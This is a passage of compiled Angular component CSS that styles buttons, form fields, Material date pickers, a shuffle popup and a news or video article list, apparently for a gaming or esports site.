            display: inline-block;
            vertical-align: middle;
            color: #fff;
            font-family: Montserrat-Bold;
            font-weight: 600;
            font-size: .9em;
            text-transform: uppercase
        }

        @media (max-width:767px) {
            .close-circle-wrap[_ngcontent-gtc-c12] p[_ngcontent-gtc-c12] {
                font-size: .75em
            }
        }

        .close-circle-wrap[_ngcontent-gtc-c12] p.close-circle[_ngcontent-gtc-c12] {
            height: 42px;
            width: 42px;
            background: 0 0;
            border: 2px solid #fff;
            cursor: pointer;
            padding: 12px;
            margin-left: 10px;
            border-radius: 100%;
            opacity: .5
        }

        .close-circle-wrap[_ngcontent-gtc-c12] p.close-circle[_ngcontent-gtc-c12] span[_ngcontent-gtc-c12] {
            height: 100%;
            width: 100%;
            display: inline-block;
            background-image: url(close-global.785be75897033bcf1c3f.png);
            background-size: 50px;
            background-repeat: no-repeat;
            background-position: center
        }

        .cta.cta--generate[_ngcontent-gtc-c12] {
            margin-top: 30px;
            padding: 16px 27px;
            background: #d0021b;
            font-family: Montserrat;
            font-size: .9em;
            font-weight: 600;
            text-transform: uppercase;
            color: #fff;
            border: none;
            border-radius: 3px;
            letter-spacing: 1px
        }

        .cta.cta--create[_ngcontent-gtc-c12] {
            text-decoration: none;
            padding: 10px 5px 10px 30px;
            background: #d0021b;
            font-family: Montserrat;
            font-size: .9em;
            font-weight: 600;
            text-transform: uppercase;
            color: #fff;
            border: 1px solid transparent;
            border-radius: 3px;
            letter-spacing: 1px
        }

        .cta.cta--create[_ngcontent-gtc-c12] span[_ngcontent-gtc-c12] {
            font-family: Montserrat;
            font-size: .8em;
            color: #fff;
            background: #9c0114;
            padding: 5px 10px;
            display: inline-block;
            border-radius: 3px;
            margin: 0 10px
        }

        .cta.cta--border-transparent[_ngcontent-gtc-c12] {
            text-decoration: none;
            padding: 10px 40px;
            background: 0 0;
            font-family: Montserrat;
            font-size: .9em;
            font-weight: 600;
            text-transform: uppercase;
            color: #fff;
            border: 1px solid #fff;
            border-radius: 3px;
            letter-spacing: 1px
        }

        .cta.cta--transparent-white[_ngcontent-gtc-c12] {
            font-family: Montserrat;
            border: 1px solid #fff;
            padding: 15px 20px;
            border-radius: 4px;
            background: 0 0;
            outline: 0;
            font-size: .9em;
            font-weight: 600;
            color: #fff;
            text-transform: uppercase;
            text-decoration: none;
            letter-spacing: 1px
        }

        .cta.cta--solid-grey[_ngcontent-gtc-c12] {
            font-family: Montserrat;
            border: 1px solid transparent;
            padding: 15px 60px;
            border-radius: 4px;
            background: #2d2d30;
            outline: 0;
            font-size: .9em;
            font-weight: 600;
            color: #6b6b6d;
            text-transform: uppercase;
            text-decoration: none;
            letter-spacing: 1px
        }

        a.close-frame[_ngcontent-gtc-c12] {
            position: absolute;
            right: 30px;
            top: 0;
            font-family: Montserrat;
            color: #fff;
            font-size: .9em;
            font-weight: 400;
            text-transform: uppercase;
            opacity: 1;
            z-index: 10
        }

        a.close-frame.close-frame--tournament[_ngcontent-gtc-c12] span[_ngcontent-gtc-c12] {
            padding: 4px 9px 4px 12px;
            border: 3px solid #6a707d;
            width: 42px;
            height: 42px;
            font-size: 20px;
            font-weight: 700;
            top: 16px
        }

        a.close-frame.close-frame--tournament[_ngcontent-gtc-c12] p[_ngcontent-gtc-c12] {
            font-family: Montserrat;
            font-size: 13px;
            font-weight: 700;
            font-style: normal;
            font-stretch: normal;
            line-height: 1.23;
            letter-spacing: 1.4px;
            text-align: center;
            color: #fff
        }

        a.close-frame[_ngcontent-gtc-c12] p[_ngcontent-gtc-c12] {
            display: inline-block
        }

        @media (max-width:767px) {
            a.close-frame[_ngcontent-gtc-c12] {
                right: 10px
            }
            a.close-frame[_ngcontent-gtc-c12] p[_ngcontent-gtc-c12] {
                display: none
            }
        }

        a.close-frame[_ngcontent-gtc-c12] span[_ngcontent-gtc-c12] {
            margin-left: 10px;
            font-family: Montserrat;
            display: inline-block;
            width: 30px;
            height: 30px;
            padding: 5px 10px;
            border: 1px solid #6a707d;
            color: #6a707d;
            font-weight: 600;
            overflow: hidden;
            border-radius: 100%;
            position: relative;
            right: 0;
            top: 10px
        }

        .form-control[_ngcontent-gtc-c12] {
            position: relative;
            font-family: Montserrat !important;
            font-size: 1em;
            outline: 0;
            background: 0 0;
            border-radius: 0;
            box-shadow: none
        }

        .form-control.form-control--default[_ngcontent-gtc-c12] {
            padding: 0;
            border: none;
            border-bottom: 1px solid rgba(106, 112, 125, .49);
            box-shadow: none;
            color: #fff
        }

        .form-control.form-control--count[_ngcontent-gtc-c12] {
            text-align: center;
            margin: 0 10px 10px;
            width: 50px;
            padding: 0;
            border: none;
            border-bottom: 1px solid rgba(106, 112, 125, .49);
            box-shadow: none;
            color: #fff
        }

        .form-control.form-control--transparent[_ngcontent-gtc-c12] {
            outline: 0;
            color: #fff;
            font-size: 1em;
            box-shadow: none;
            padding: 0;
            background: 0 0;
            border: none;
            box-shadow: none
        }

        .form-control.form-control--textarea[_ngcontent-gtc-c12] {
            outline: 0;
            color: #fff;
            font-size: 1em;
            box-shadow: none;
            padding: 10px;
            border-radius: 4px;
            background-color: rgba(106, 112, 125, .19);
            border: none;
            box-shadow: none
        }

        .form-control[_ngcontent-gtc-c12]::-moz-placeholder {
            color: #69707e
        }

        .form-control[_ngcontent-gtc-c12]::-ms-input-placeholder {
            color: #69707e
        }

        .form-control[_ngcontent-gtc-c12]::placeholder {
            color: #69707e
        }

        .header-text[_ngcontent-gtc-c12] h3[_ngcontent-gtc-c12] {
            font-family: Montserrat-Bold;
            font-size: 2.3em;
            text-transform: capitalize;
            color: #fff
        }

        @media (max-width:767px) {
            a.close-frame[_ngcontent-gtc-c12] span[_ngcontent-gtc-c12] {
                right: 10px
            }
            .header-text[_ngcontent-gtc-c12] h3[_ngcontent-gtc-c12] {
                font-size: 1.5em
            }
        }

        .header-text[_ngcontent-gtc-c12] h4[_ngcontent-gtc-c12] {
            font-family: Montserrat-Bold;
            font-size: 1.5em;
            color: #fff
        }

        .header-text[_ngcontent-gtc-c12] p[_ngcontent-gtc-c12] {
            font-family: Montserrat;
            font-size: 1em;
            font-weight: 400;
            font-style: normal;
            font-stretch: normal;
            line-height: 1.5;
            letter-spacing: normal;
            text-align: center;
            color: #b4b4c0
        }

        .header-text-medium[_ngcontent-gtc-c12] h3[_ngcontent-gtc-c12] {
            font-family: Montserrat-Bold;
            font-size: 2em;
            color: #fff
        }

        .header-text-small[_ngcontent-gtc-c12] h3[_ngcontent-gtc-c12] {
            font-family: Montserrat-Bold;
            font-size: 1.5em;
            color: #fff
        }

        @media (max-width:767px) {
            .header-text-medium[_ngcontent-gtc-c12] h3[_ngcontent-gtc-c12],
            .header-text-small[_ngcontent-gtc-c12] h3[_ngcontent-gtc-c12] {
                font-size: 1.5em
            }
        }

        .header-text-extra-small[_ngcontent-gtc-c12] h3[_ngcontent-gtc-c12] {
            font-family: Montserrat;
            font-size: 1.2em;
            color: #fff
        }

        @media (max-width:767px) {
            .header-text-extra-small[_ngcontent-gtc-c12] h3[_ngcontent-gtc-c12] {
                font-size: 1em
            }
        }

        .header-text-extra-small-bold[_ngcontent-gtc-c12] h3[_ngcontent-gtc-c12] {
            font-family: Montserrat-Bold;
            font-size: 1.2em;
            color: #fff
        }

        .body-text[_ngcontent-gtc-c12] p[_ngcontent-gtc-c12] {
            font-family: Montserrat;
            font-size: 1em;
            font-weight: 400;
            font-style: normal;
            font-stretch: normal;
            line-height: 1.5;
            letter-spacing: normal;
            text-align: center;
            color: #b4b4c0
        }

        .description-text[_ngcontent-gtc-c12] p[_ngcontent-gtc-c12] {
            font-size: 1em;
            color: #fff
        }

        .radio-input[_ngcontent-gtc-c12] {
            position: absolute;
            left: 0;
            right: 0;
            top: 0;
            bottom: 0;
            height: 100%;
            width: 100%;
            z-index: 9;
            opacity: 0
        }

        .middle-top[_ngcontent-gtc-c12] {
            margin: auto;
            position: absolute;
            top: 50%;
            left: 0;
            right: 0;
            transform: translateY(-50%)
        }

        .fleft[_ngcontent-gtc-c12] {
            float: left
        }

        .fright[_ngcontent-gtc-c12] {
            float: right
        }

        .row[_ngcontent-gtc-c12] .padding-left-0[_ngcontent-gtc-c12] {
            padding-left: 0
        }

        .form-group.form-group--media[_ngcontent-gtc-c12] {
            position: relative;
            border-bottom: 1px solid #2b2e34
        }

        .dd-selected[_ngcontent-gtc-c12] {
            background: 0 0
        }

        .invalid-feedback[_ngcontent-gtc-c12] {
            text-align: left;
            position: relative;
            z-index: 1
        }

        .popup-shuffle[_ngcontent-gtc-c12] {
            position: fixed;
            width: 100%;
            height: 100%;
            top: 0;
            left: 0;
            z-index: 99
        }

        .popup-shuffle[_ngcontent-gtc-c12]:before {
            content: "";
            position: absolute;
            width: 100%;
            height: 100%;
            top: 0;
            left: 0;
            background-color: rgba(0, 0, 0, .8)
        }

        .popup-shuffle[_ngcontent-gtc-c12] .shuffle-container[_ngcontent-gtc-c12] {
            width: 400px;
            height: 120px;
            max-width: 90vw;
            position: absolute;
            top: 0;
            left: 0;
            right: 0;
            bottom: 0;
            margin: auto;
            border: 3px solid #6a707d;
            background: #1d1f23;
            border-radius: 4px;
            display: block
        }

        .popup-shuffle[_ngcontent-gtc-c12] .shuffle-container[_ngcontent-gtc-c12]>.row[_ngcontent-gtc-c12] {
            display: block;
            position: absolute;
            top: 50%;
            transform: translateY(-50%)
        }

        .popup-shuffle[_ngcontent-gtc-c12] .shuffle-container[_ngcontent-gtc-c12] .shuffle-pop-table[_ngcontent-gtc-c12] {
            display: table
        }

        .popup-shuffle[_ngcontent-gtc-c12] .shuffle-container[_ngcontent-gtc-c12] .shuffle-pop-table[_ngcontent-gtc-c12] .shuffle-pop-item[_ngcontent-gtc-c12] {
            display: table-cell;
            vertical-align: middle;
            width: 80%;
            padding-left: 20px
        }

        .popup-shuffle[_ngcontent-gtc-c12] .shuffle-container[_ngcontent-gtc-c12] .shuffle-pop-table[_ngcontent-gtc-c12] .shuffle-pop-item.img[_ngcontent-gtc-c12] {
            width: 20%;
            padding-left: 0
        }

        .popup-shuffle[_ngcontent-gtc-c12] .shuffle-container[_ngcontent-gtc-c12] img[_ngcontent-gtc-c12] {
            max-width: 100%
        }

        .popup-shuffle[_ngcontent-gtc-c12] .shuffle-container[_ngcontent-gtc-c12] p[_ngcontent-gtc-c12] {
            color: #fff;
            font-size: 1em
        }

        .popup-shuffle[_ngcontent-gtc-c12] .shuffle-container[_ngcontent-gtc-c12] p[_ngcontent-gtc-c12] strong[_ngcontent-gtc-c12] {
            font-size: 1.09em
        }

        .mat-datepicker-content[_ngcontent-gtc-c12] {
            background: #1d1f23
        }

        .mat-calendar-body-cell-content[_ngcontent-gtc-c12] {
            color: #fff
        }

        .mat-calendar-body-disabled[_ngcontent-gtc-c12]>.mat-calendar-body-cell-content[_ngcontent-gtc-c12]:not(.mat-calendar-body-selected) {
            color: #616161
        }

        .mat-calendar-body-label[_ngcontent-gtc-c12],
        .mat-calendar-table-header[_ngcontent-gtc-c12] th[_ngcontent-gtc-c12],
        .mat-datepicker-content[_ngcontent-gtc-c12] .mat-calendar-next-button[_ngcontent-gtc-c12],
        .mat-datepicker-content[_ngcontent-gtc-c12] .mat-calendar-previous-button[_ngcontent-gtc-c12],
        .mat-datepicker-toggle[_ngcontent-gtc-c12],
        .mat-icon-button[disabled][disabled][_ngcontent-gtc-c12] {
            color: #fff
        }

        .mat-calendar-arrow[_ngcontent-gtc-c12] {
            border-top-color: #fff
        }

        .mat-calendar-header[_ngcontent-gtc-c12] {
            color: #fff
        }

        .cdk-keyboard-focused[_ngcontent-gtc-c12] .mat-calendar-body-active[_ngcontent-gtc-c12]>.mat-calendar-body-cell-content[_ngcontent-gtc-c12]:not(.mat-calendar-body-selected),
        .cdk-program-focused[_ngcontent-gtc-c12] .mat-calendar-body-active[_ngcontent-gtc-c12]>.mat-calendar-body-cell-content[_ngcontent-gtc-c12]:not(.mat-calendar-body-selected),
        .mat-calendar-body-cell[_ngcontent-gtc-c12]:not(.mat-calendar-body-disabled):hover>.mat-calendar-body-cell-content[_ngcontent-gtc-c12]:not(.mat-calendar-body-selected),
        .mat-calendar-body-today[_ngcontent-gtc-c12]:not(.mat-calendar-body-selected) {
            border-color: transparent;
            background: #d0021b
        }

        .mat-calendar-body-selected[_ngcontent-gtc-c12] {
            background: #d0021b;
            box-shadow: none
        }

        .block-url[_ngcontent-gtc-c12] {
            position: absolute;
            content: "";
            left: 0;
            right: 0;
            top: 0;
            bottom: 0;
            z-index: 91
        }

        .mat-primary[_ngcontent-gtc-c12] .mat-option.mat-selected[_ngcontent-gtc-c12]:not(.mat-option-disabled) {
            color: #000;
            opacity: .8
        }

        .mat-select-panel[_ngcontent-gtc-c12] .mat-option[_ngcontent-gtc-c12] {
            color: #797979
        }

        .ngx-editor-textarea[_ngcontent-gtc-c12] div[_ngcontent-gtc-c12],
        .ngx-editor-textarea[_ngcontent-gtc-c12] section[_ngcontent-gtc-c12] {
            max-width: 100% !important;
            width: 100% !important;
            background: 0 0 !important;
            box-shadow: none !important
        }

        .ngx-editor-textarea[_ngcontent-gtc-c12] div[_ngcontent-gtc-c12] img[_ngcontent-gtc-c12],
        .ngx-editor-textarea[_ngcontent-gtc-c12] section[_ngcontent-gtc-c12] img[_ngcontent-gtc-c12] {
            width: 100% !important
        }

        .ngx-editor-textarea[_ngcontent-gtc-c12] a[_ngcontent-gtc-c12] {
            text-decoration: none !important;
            border: none !important
        }

        .ngx-editor-textarea[_ngcontent-gtc-c12] *[_ngcontent-gtc-c12] {
            max-width: 100% !important;
            font-family: Montserrat !important;
            background: 0 0 !important;
            line-height: 1.5;
            word-break: break-word !important;
            text-indent: unset !important
        }

        .ngx-editor-textarea[_ngcontent-gtc-c12] b[_ngcontent-gtc-c12] {
            font-family: Montserrat-Bold !important
        }

        .ngx-editor-textarea[_ngcontent-gtc-c12] b[_ngcontent-gtc-c12] *[_ngcontent-gtc-c12] {
            font-family: Montserrat-Bold !important;
            text-indent: unset !important
        }

        .ngx-editor-textarea[_ngcontent-gtc-c12] td[_ngcontent-gtc-c12] {
            border-color: #6a707d !important;
            padding: 8px !important
        }

        .app-layout-wrap[_ngcontent-gtc-c12] {
            background-color: #000
        }

        @media (min-width:1200px) {
            .d-main[_ngcontent-gtc-c12] {
                max-width: 1440px;
                margin: 0 auto
            }
            .layout-content[_ngcontent-gtc-c12] {
                background-color: #000
            }
        }

        .d-absolute--center[_ngcontent-gtc-c12] {
            position: absolute;
            top: 40%;
            width: 100%;
            text-align: center;
            z-index: 2
        }

        .d-absolute--center[_ngcontent-gtc-c12] img[_ngcontent-gtc-c12] {
            width: 50px;
            opacity: .5
        }

        .article-list[_ngcontent-gtc-c12] {
            background-repeat: no-repeat;
            background-size: cover;
            position: relative;
            padding: 40px 0 30px;
            background-color: #161619
        }

        @media (max-width:767px) {
            .header-text-extra-small-bold[_ngcontent-gtc-c12] h3[_ngcontent-gtc-c12] {
                font-size: 1em
            }
            .fleft[_ngcontent-gtc-c12] {
                float: right
            }
            .fright[_ngcontent-gtc-c12] {
                float: left
            }
            .popup-shuffle[_ngcontent-gtc-c12] .shuffle-container[_ngcontent-gtc-c12] .shuffle-pop-table[_ngcontent-gtc-c12] {
                padding: 0 20px
            }
            .mat-datepicker-toggle[_ngcontent-gtc-c12] button.mat-icon-button[_ngcontent-gtc-c12] {
                top: auto;
                bottom: 7px
            }
            .article-list[_ngcontent-gtc-c12] {
                padding: 25px 0 30px
            }
        }

        .article-list[_ngcontent-gtc-c12] .url[_ngcontent-gtc-c12] {
            position: absolute;
            left: 0;
            right: 0;
            top: 0;
            bottom: 0;
            z-index: 9
        }

        .article-list[_ngcontent-gtc-c12]>.shade[_ngcontent-gtc-c12] {
            position: absolute;
            left: 0;
            top: 0;
            width: 100%;
            height: 236px;
            background: linear-gradient(to bottom, #342441, #161619 100%);
            filter: progid:DXImageTransform.Microsoft.gradient(startColorstr='#342441', endColorstr='#161619', GradientType=0)
        }

        .article-list[_ngcontent-gtc-c12] .row[_ngcontent-gtc-c12] {
            margin-left: -10px;
            margin-right: 0
        }

        .article-list[_ngcontent-gtc-c12] .row[_ngcontent-gtc-c12] [class*=col-][_ngcontent-gtc-c12] {
            padding-left: 10px;
            padding-right: 5px
        }

        @media (max-width:991px) {
            .article-list[_ngcontent-gtc-c12] .row[_ngcontent-gtc-c12] {
                margin-right: -10px
            }
            .article-list[_ngcontent-gtc-c12] .row[_ngcontent-gtc-c12] [class*=col-][_ngcontent-gtc-c12] {
                padding-right: 10px
            }
        }

        .article-list[_ngcontent-gtc-c12] header[_ngcontent-gtc-c12] {
            position: relative
        }

        .article-list[_ngcontent-gtc-c12] .header-title[_ngcontent-gtc-c12] {
            border-bottom: 2px solid rgba(255, 255, 255, .2);
            padding-bottom: 8px
        }

        .article-list[_ngcontent-gtc-c12] .header-title[_ngcontent-gtc-c12] h3[_ngcontent-gtc-c12] {
            position: relative;
            font-family: Montserrat-Bold;
            font-size: 2.1em;
            font-weight: 600;
            color: #fff;
            padding-left: 30px;
            line-height: 1.5
        }

        .article-list[_ngcontent-gtc-c12] .header-title[_ngcontent-gtc-c12] h3[_ngcontent-gtc-c12]::before {
            position: absolute;
            content: "";
            left: 0;
            top: 20px;
            height: 3px;
            width: 16px;
            background: #d0021b
        }

        .article-list[_ngcontent-gtc-c12] .header-title[_ngcontent-gtc-c12] .change-view[_ngcontent-gtc-c12] {
            position: absolute;
            float: right;
            right: 0;
            top: 45%;
            align-items: center;
            transform: translate(-9%, -49%);
            color: #fff;
            font-size: 12px;
            cursor: pointer
        }

        .article-list[_ngcontent-gtc-c12] .header-title[_ngcontent-gtc-c12] .change-view[_ngcontent-gtc-c12] i[_ngcontent-gtc-c12]:first-child {
            margin: 0 20px 0 0
        }

        .article-list[_ngcontent-gtc-c12] .header-title[_ngcontent-gtc-c12] .change-view[_ngcontent-gtc-c12] i[_ngcontent-gtc-c12] {
            opacity: .2
        }

        @media (max-width:767px) {
            .article-list[_ngcontent-gtc-c12] .header-title[_ngcontent-gtc-c12] {
                border-bottom: unset
            }
            .article-list[_ngcontent-gtc-c12] .header-title[_ngcontent-gtc-c12] h3[_ngcontent-gtc-c12] {
                padding-left: 25px;
                font-size: 18px;
                width: 80%
            }
            .article-list[_ngcontent-gtc-c12] .header-title[_ngcontent-gtc-c12] h3[_ngcontent-gtc-c12]::before {
                width: 12px;
                top: 12px
            }
            .article-list[_ngcontent-gtc-c12] .header-title[_ngcontent-gtc-c12] .change-view.lang-en[_ngcontent-gtc-c12] {
                top: 41%
            }
            .article-list[_ngcontent-gtc-c12] .header-title[_ngcontent-gtc-c12] .change-view.lang-id[_ngcontent-gtc-c12] {
                top: 24%
            }
            .article-list[_ngcontent-gtc-c12] .header-title[_ngcontent-gtc-c12] .change-view[_ngcontent-gtc-c12] i[_ngcontent-gtc-c12]:first-child {
                margin: 0 12px 0 0
            }
            .article-list[_ngcontent-gtc-c12] .header-title[_ngcontent-gtc-c12] .change-view[_ngcontent-gtc-c12] i.fa-2x[_ngcontent-gtc-c12] {
                font-size: 20px
            }
        }

        .article-list[_ngcontent-gtc-c12] .header-title[_ngcontent-gtc-c12] .change-view[_ngcontent-gtc-c12] i.active[_ngcontent-gtc-c12] {
            opacity: .8
        }

        .article-list[_ngcontent-gtc-c12] .subheader-title[_ngcontent-gtc-c12] h3[_ngcontent-gtc-c12] {
            position: relative;
            font-family: Montserrat-Bold;
            font-size: 2.1em;
            font-weight: 600;
            color: #fff
        }

        .article-list[_ngcontent-gtc-c12] .news-list[_ngcontent-gtc-c12] {
            margin-top: 30px
        }

        .article-list[_ngcontent-gtc-c12] .news-list[_ngcontent-gtc-c12] .latest-content-video__post[_ngcontent-gtc-c12] {
            position: relative;
            height: 361px;
            background-size: cover;
            background-position: top center;
            background-repeat: no-repeat;
            margin-bottom: 15px;
            border-radius: 4px
        }

        .article-list[_ngcontent-gtc-c12] .news-list[_ngcontent-gtc-c12] .latest-content-video__post[_ngcontent-gtc-c12]:before {
            content: '';
            position: absolute;
            top: 0;
            right: 0;
            bottom: 0;
            left: 0;
            border-radius: 4px;
            background-image: linear-gradient(to bottom, transparent, transparent 30%, #161619 98%)
        }

        .article-list[_ngcontent-gtc-c12] .news-list[_ngcontent-gtc-c12] .latest-content-video__post[_ngcontent-gtc-c12] .caption-small[_ngcontent-gtc-c12] {
            position: absolute;
            bottom: 10px;
            left: 0;
            right: 0;
            padding: 15px;
            z-index: 9
        }

        .article-list[_ngcontent-gtc-c12] .news-list[_ngcontent-gtc-c12] .latest-content-video__post[_ngcontent-gtc-c12] .caption-small[_ngcontent-gtc-c12] span[_ngcontent-gtc-c12] {
            font-family: Montserrat;
            font-size: .8em;
            color: #fff;
            text-transform: uppercase
        }

        .article-list[_ngcontent-gtc-c12] .news-list[_ngcontent-gtc-c12] .latest-content-video__post[_ngcontent-gtc-c12] .caption-small[_ngcontent-gtc-c12] h3[_ngcontent-gtc-c12] {
            margin: 20px 0 0;
            font-family: Montserrat;
            color: #fff;
            font-size: 1.1em;
            font-weight: 600;
            line-height: 1.5;
            letter-spacing: 1px
        }

        .article-list[_ngcontent-gtc-c12] .news-list[_ngcontent-gtc-c12] .latest-content-video__post[_ngcontent-gtc-c12] .live[_ngcontent-gtc-c12] {
            margin: 15px;
            position: relative;
            display: inline-block;
            padding: 5px 10px 5px 20px;
            font-family: Montserrat;
            font-size: .8em;
            color: #fff;
            background: #d0021b;
            text-transform: uppercase;
            border-radius: 5px
        }

        .article-list[_ngcontent-gtc-c12] .news-list[_ngcontent-gtc-c12] .latest-content-video__post[_ngcontent-gtc-c12] .live[_ngcontent-gtc-c12] span[_ngcontent-gtc-c12] {
            position: relative
        }

        .article-list[_ngcontent-gtc-c12] .news-list[_ngcontent-gtc-c12] .latest-content-video__post[_ngcontent-gtc-c12] .live[_ngcontent-gtc-c12] span[_ngcontent-gtc-c12]::before {
            position: absolute;
            content: "";
            height: 4px;
            width: 4px;
            display: inline-block;
            overflow: hidden;
            border-radius: 100%;
            left: -10px;
            top: 5px;
            background: #fff
        }

        .article-list[_ngcontent-gtc-c12] .news-list[_ngcontent-gtc-c12] .latest-content-video__post[_ngcontent-gtc-c12] .caption[_ngcontent-gtc-c12] {
            position: absolute;
            bottom: 10px;
            left: 0;
            right: 0;
            padding: 24px 24px 15px;
            z-index: 9
        }

        .article-list[_ngcontent-gtc-c12] .news-list[_ngcontent-gtc-c12] .latest-content-video__post[_ngcontent-gtc-c12] .caption[_ngcontent-gtc-c12] .event-item .date {
            color: #b4b4c0 !important;
            font-size: 10px
        }

        .article-list[_ngcontent-gtc-c12] .news-list[_ngcontent-gtc-c12] .latest-content-video__post[_ngcontent-gtc-c12] .caption[_ngcontent-gtc-c12] .event-item small {
            margin: 2px 0 0 7px
        }

        .article-list[_ngcontent-gtc-c12] .news-list[_ngcontent-gtc-c12] .latest-content-video__post[_ngcontent-gtc-c12] .caption[_ngcontent-gtc-c12] .date[_ngcontent-gtc-c12] {
            padding: 4px 10px;
            margin-top: 10px;
            margin-right: 5px;
            overflow: hidden;
            border-radius: 5px;
            background: #161619;
            color: #fff;
            font-family: Montserrat;
            font-size: 12px;
            text-transform: uppercase
        }

        .article-list[_ngcontent-gtc-c12] .news-list[_ngcontent-gtc-c12] .latest-content-video__post[_ngcontent-gtc-c12] .caption[_ngcontent-gtc-c12] .date[_ngcontent-gtc-c12] i[_ngcontent-gtc-c12] {
            font-size: 16px;
            margin-right: 6px
        }

        .article-list[_ngcontent-gtc-c12] .news-list[_ngcontent-gtc-c12] .latest-content-video__post[_ngcontent-gtc-c12] .caption[_ngcontent-gtc-c12] .date.style2[_ngcontent-gtc-c12] {
            background: 0 0;
            border-radius: 0;
            padding: 0;
            margin: 10px 0 0;
            line-height: 12px;
            font-size: 12px;
            text-transform: uppercase
        }

        .article-list[_ngcontent-gtc-c12] .news-list[_ngcontent-gtc-c12] .latest-content-video__post[_ngcontent-gtc-c12] .caption[_ngcontent-gtc-c12] span[_ngcontent-gtc-c12] {
            font-family: Montserrat;
            color: #fff;
            font-size: 12px;
            text-transform: uppercase
        }

        .article-list[_ngcontent-gtc-c12] .news-list[_ngcontent-gtc-c12] .latest-content-video__post[_ngcontent-gtc-c12] .caption[_ngcontent-gtc-c12] h3[_ngcontent-gtc-c12] {
            margin: 20px 0 15px;
            font-family: Montserrat;
            color: #fff;
            font-size: 16px;
            overflow: hidden;
            font-weight: 600;
            line-height: 1.5;
            letter-spacing: 1px;
            cursor: pointer;
            -webkit-box-orient: vertical;
            display: -webkit-box;
            -webkit-line-clamp: 2;
            text-overflow: ellipsis
        }

        .article-list[_ngcontent-gtc-c12] .news-list[_ngcontent-gtc-c12] .latest-content-video__post[_ngcontent-gtc-c12] .caption[_ngcontent-gtc-c12] img[_ngcontent-gtc-c12] {
            width: 50px;
            position: absolute;
            top: 0;
            bottom: 200px;
            left: 0;
            right: 0;
            margin: auto
        }

        .article-list[_ngcontent-gtc-c12] .news-list[_ngcontent-gtc-c12] .container-item[_ngcontent-gtc-c12]:nth-child(1n) .latest-content-video__post[_ngcontent-gtc-c12]:before {
            background-image: linear-gradient(to bottom, transparent, transparent 30%, #1b203c 98%)
        }

        .article-list[_ngcontent-gtc-c12] .news-list[_ngcontent-gtc-c12] .container-item[_ngcontent-gtc-c12]:nth-child(2n) .latest-content-video__post[_ngcontent-gtc-c12]:before {
            background-image: linear-gradient(to bottom, transparent, transparent 30%, #141e1d 98%)
        }

        .article-list[_ngcontent-gtc-c12] .news-list[_ngcontent-gtc-c12] .container-item[_ngcontent-gtc-c12]:nth-child(3n) .latest-content-video__post[_ngcontent-gtc-c12]:before {
            background-image: linear-gradient(to bottom, transparent, transparent 30%, #3b1919 98%)
        }

        .article-list[_ngcontent-gtc-c12] .news-list[_ngcontent-gtc-c12] .container-item[_ngcontent-gtc-c12]:nth-child(4n) .latest-content-video__post[_ngcontent-gtc-c12]:before {
            background-image: linear-gradient(to bottom, transparent, transparent 30%, #1b203c 98%)
        }

        .article-list[_ngcontent-gtc-c12] .news-list[_ngcontent-gtc-c12] .container-item[_ngcontent-gtc-c12]:nth-child(5n) .latest-content-video__post[_ngcontent-gtc-c12]:before {
            background-image: linear-gradient(to bottom, transparent, transparent 30%, #3e301f 98%)
        }

        .article-list[_ngcontent-gtc-c12] .news-list[_ngcontent-gtc-c12] .container-item[_ngcontent-gtc-c12]:nth-child(6n) .latest-content-video__post[_ngcontent-gtc-c12]:before,
        .article-list[_ngcontent-gtc-c12] .news-list[_ngcontent-gtc-c12] .container-item[_ngcontent-gtc-c12]:nth-child(7n) .latest-content-video__post[_ngcontent-gtc-c12]:before {
            background-image: linear-gradient(to bottom, transparent, transparent 30%, #1b203c 98%)
        }

        .article-list[_ngcontent-gtc-c12] .news-list[_ngcontent-gtc-c12] .container-item[_ngcontent-gtc-c12]:nth-child(8n) .latest-content-video__post[_ngcontent-gtc-c12]:before {
            background-image: linear-gradient(to bottom, transparent, transparent 30%, #3e301f 98%)
        }

        .article-list[_ngcontent-gtc-c12] .news-list[_ngcontent-gtc-c12] .container-item[_ngcontent-gtc-c12]:nth-child(9n) .latest-content-video__post[_ngcontent-gtc-c12]:before {
            background-image: linear-gradient(to bottom, transparent, transparent 30%, #1b203c 98%)
        }

        .article-list[_ngcontent-gtc-c12] .news-list[_ngcontent-gtc-c12] .container-item[_ngcontent-gtc-c12]:nth-child(10n) .latest-content-video__post[_ngcontent-gtc-c12]:before {
            background-image: linear-gradient(to bottom, transparent, transparent 30%, #141e1d 98%)
        }

        .article-list[_ngcontent-gtc-c12] .news-list[_ngcontent-gtc-c12] .container-item[_ngcontent-gtc-c12]:nth-child(11n) .latest-content-video__post[_ngcontent-gtc-c12]:before {
            background-image: linear-gradient(to bottom, transparent, transparent 30%, #3b1919 98%)
        }

        .article-list[_ngcontent-gtc-c12] .news-list[_ngcontent-gtc-c12] .container-item[_ngcontent-gtc-c12]:nth-child(12n) .latest-content-video__post[_ngcontent-gtc-c12]:before {
            background-image: linear-gradient(to bottom, transparent, transparent 30%, #1b203c 98%)
        }

        .article-list[_ngcontent-gtc-c12] .news-list[_ngcontent-gtc-c12] .container-item[_ngcontent-gtc-c12]:nth-child(13n) .latest-content-video__post[_ngcontent-gtc-c12]:before {
            background-image: linear-gradient(to bottom, transparent, transparent 30%, #3e301f 98%)
        }

        .article-list[_ngcontent-gtc-c12] .news-listview[_ngcontent-gtc-c12] .list-wrapper[_ngcontent-gtc-c12] article[_ngcontent-gtc-c12] {
            padding: 20px 0;
            overflow: auto;
            border-bottom: 2px solid #444447;
            cursor: pointer
        }

        .article-list[_ngcontent-gtc-c12] .news-listview[_ngcontent-gtc-c12] .list-wrapper[_ngcontent-gtc-c12] article[_ngcontent-gtc-c12]:focus {
            outline: 0
        }

        @media (max-width:767px) {
            .article-list[_ngcontent-gtc-c12] .news-list[_ngcontent-gtc-c12] {
                margin-top: 10px
            }
            .article-list[_ngcontent-gtc-c12] .news-list[_ngcontent-gtc-c12] .latest-content-video__post[_ngcontent-gtc-c12] .caption[_ngcontent-gtc-c12] .event-item .date {
                color: #b4b4c0 !important;
                font-size: 10px
            }
            .article-list[_ngcontent-gtc-c12] .news-list[_ngcontent-gtc-c12] .latest-content-video__post[_ngcontent-gtc-c12] .caption[_ngcontent-gtc-c12] .event-item small {
                margin: 2px 0 0 7px
            }
            .article-list[_ngcontent-gtc-c12] .news-listview[_ngcontent-gtc-c12] .list-wrapper[_ngcontent-gtc-c12] article[_ngcontent-gtc-c12] {
                border: none
            }
            .article-list[_ngcontent-gtc-c12] .news-listview[_ngcontent-gtc-c12] .list-wrapper[_ngcontent-gtc-c12] article[_ngcontent-gtc-c12] .d-absolute--center[_ngcontent-gtc-c12] {
                top: 35%
            }
